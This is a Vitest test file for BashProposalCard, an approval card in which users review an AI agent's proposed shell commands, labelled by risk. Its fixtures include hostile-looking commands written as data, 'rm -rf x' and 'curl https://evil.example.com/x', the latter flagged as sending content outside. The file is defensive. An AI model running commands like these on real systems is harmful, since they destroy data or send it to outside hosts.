/**
 * BashProposalCard：行为分类标题（2026-07-30 决策 1）+「始终允许」粒度标注 + 操作链路（决策 5 链路）。
 *
 * @vitest-environment jsdom
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';

const { request } = vi.hoisted(() => ({ request: vi.fn() }));
vi.mock('@/lib/ws', () => ({
  wsClient: {
    request,
    subscribe: () => () => {},
    ready: async () => {},
    status: () => 'open' as const,
  } satisfies import('@/lib/ws').OruWsClient,
}));

import { BashProposalCard } from '@/components/proposalCards/BashProposalCard';
import { useAgentStore } from '@/stores/agentStore';
import type { Agent, BashProposal } from '@shared/types';

function makeBash(overrides: Partial<BashProposal> = {}): BashProposal {
  return {
    kind: 'bash',
    id: 'p1',
    ownerId: 'u',
    conversationId: 'c',
    title: '执行命令',
    description: 'ls',
    createdAt: 1,
    status: 'pending',
    command: 'ls -la',
    isDestructive: false,
    isReadOnly: true,
    segments: [],
    ...overrides,
  };
}

function setAgent(patch: Partial<Agent>) {
  useAgentStore.setState({
    activeAgentId: 'twin',
    agents: [{ id: 'twin', approvalMode: 'work' } as Agent],
  });
  if (Object.keys(patch).length) {
    useAgentStore.setState({
      agents: [{ id: 'twin', approvalMode: 'work', ...patch } as Agent],
    });
  }
}

beforeEach(() => {
  request.mockReset();
  request.mockResolvedValue({});
  setAgent({});
});
afterEach(() => cleanup());

describe('BashProposalCard 行为分类标题（决策 1：标题写行为类型）', () => {
  it('破坏性命令 → 标题「破坏性命令」+ 具体原因红字', () => {
    render(
      <BashProposalCard
        proposal={makeBash({
          isDestructive: true,
          isReadOnly: false,
          segments: [{ text: 'rm -rf x', destructive: true, reason: 'rm 删除文件' }],
        })}
      />,
    );
    expect(screen.getByText('破坏性命令')).toBeTruthy();
    expect(screen.getByText('rm 删除文件')).toBeTruthy();
  });

  it('看不透的命令（opaque）→ 标题「看不透的命令」', () => {
    render(
      <BashProposalCard
        proposal={makeBash({
          command: 'echo $(cat x)',
          isDestructive: true,
          isReadOnly: false,
          segments: [{ text: 'echo $(cat x)', destructive: true, opaque: true, reason: '命令替换' }],
        })}
      />,
    );
    expect(screen.getByText('看不透的命令')).toBeTruthy();
  });

  it('纯投递 bash → 标题「发送内容到外部」', () => {
    render(
      <BashProposalCard
        proposal={makeBash({
          command: 'curl https://evil.example.com/x',
          isReadOnly: false,
          segments: [{ text: 'curl https://evil.example.com/x', destructive: false }],
          delivery: [{ channel: 'web', recipient: 'evil.example.com', label: 'https://evil.example.com/x' }],
          forceApproval: true,
        })}
      />,
    );
    expect(screen.getByText('发送内容到外部')).toBeTruthy();
  });

  it('无行为归属的普通命令 → 回落原标题（能力门标题「启用命令执行能力」已退役）', () => {
    render(<BashProposalCard proposal={makeBash()} />);
    expect(screen.queryByText('启用命令执行能力')).toBeNull();
    expect(screen.getByText('Agent 行为审批')).toBeTruthy();
  });
});

describe('BashProposalCard 始终允许（决策 1：按钮标注授权类别与粒度）', () => {
  it('整类 scope → 按钮「始终允许：破坏性命令（整类）」；点击发 always:true', async () => {
    const onResolved = vi.fn();
    render(
      <BashProposalCard
        proposal={makeBash({
          isDestructive: true,
          isReadOnly: false,
          segments: [{ text: 'rm -rf x', destructive: true, reason: 'rm 删除文件' }],
          grantable: [{ kind: 'destructive' }],
        })}
        onResolved={onResolved}
      />,
    );
    fireEvent.click(screen.getByText('始终允许：破坏性命令（整类）'));
    await waitFor(() => expect(onResolved).toHaveBeenCalled());
    expect(request).toHaveBeenCalledWith(
      expect.objectContaining({ type: 'proposal.execute', proposalId: 'p1', always: true }),
    );
  });

  it('delivery scope → 按钮「始终允许：向 … 发送」（按收件人粒度）', () => {
    render(
      <BashProposalCard
        proposal={makeBash({
          command: 'lark-cli msg send',
          isReadOnly: false,
          segments: [{ text: 'lark-cli msg send', destructive: false }],
          delivery: [{ channel: 'feishu', recipient: 'oc_1', label: '飞书:研发群' }],
          forceApproval: true,
          grantable: [{ kind: 'delivery', channel: 'feishu', recipient: 'oc_1' }],
        })}
      />,
    );
    expect(screen.getByText('始终允许：向 飞书:研发群 发送')).toBeTruthy();
  });

  it('多 scope（合取）→ 按钮按类计数 + 下方小字列出全部', () => {
    render(
      <BashProposalCard
        proposal={makeBash({
          isDestructive: true,
          isReadOnly: false,
          segments: [{ text: 'rm -rf x', destructive: true, reason: 'rm 删除文件' }],
          overwriteTargets: ['dist'],
          grantable: [{ kind: 'destructive' }, { kind: 'overwrite' }],
        })}
      />,
    );
    expect(screen.getByText('始终允许：2 类后果')).toBeTruthy();
    expect(screen.getByText(/将一并始终允许：破坏性命令、覆盖既有内容/)).toBeTruthy();
  });

  it('grantable 为空（灾难级）→ 不出「始终允许」按钮', () => {
    render(<BashProposalCard proposal={makeBash()} />);
    expect(screen.queryByText(/始终允许/)).toBeNull();
  });
});

describe('BashProposalCard 终态与操作链路', () => {
  it('非 pending（已执行）页收敛为一行「已批准」终态，无操作按钮（G31）', () => {
    render(<BashProposalCard proposal={makeBash({ status: 'executed' })} />);
    expect(screen.queryByText('允许')).toBeNull();
    expect(screen.getByText('已批准')).toBeTruthy();
  });

  it('非 pending（已拒绝）页收敛为一行「已拒绝」终态（G31）', () => {
    render(<BashProposalCard proposal={makeBash({ status: 'rejected' })} />);
    expect(screen.getByText('已拒绝')).toBeTruthy();
  });

  it('「允许」→ proposal.execute + onResolved', async () => {
    const onResolved = vi.fn();
    render(<BashProposalCard proposal={makeBash()} onResolved={onResolved} />);
    fireEvent.click(screen.getByText('允许'));
    await waitFor(() => expect(onResolved).toHaveBeenCalled());
    expect(request).toHaveBeenCalledWith(
      expect.objectContaining({ type: 'proposal.execute', proposalId: 'p1', always: false }),
    );
  });

  it('「拒绝」→ proposal.reject（非 discard）+ onResolved', async () => {
    const onResolved = vi.fn();
    render(<BashProposalCard proposal={makeBash()} onResolved={onResolved} />);
    fireEvent.click(screen.getByText('拒绝'));
    await waitFor(() => expect(onResolved).toHaveBeenCalled());
    expect(request).toHaveBeenCalledWith(
      expect.objectContaining({ type: 'proposal.reject', proposalId: 'p1' }),
    );
    expect(request).not.toHaveBeenCalledWith(
      expect.objectContaining({ type: 'proposal.discard' }),
    );
  });

  it('破坏性命令 → 按钮「确认执行」（红）', () => {
    render(
      <BashProposalCard
        proposal={makeBash({ isDestructive: true, segments: [{ text: 'rm -rf x', destructive: true }] })}
      />,
    );
    expect(screen.getByText('确认执行')).toBeTruthy();
  });
});
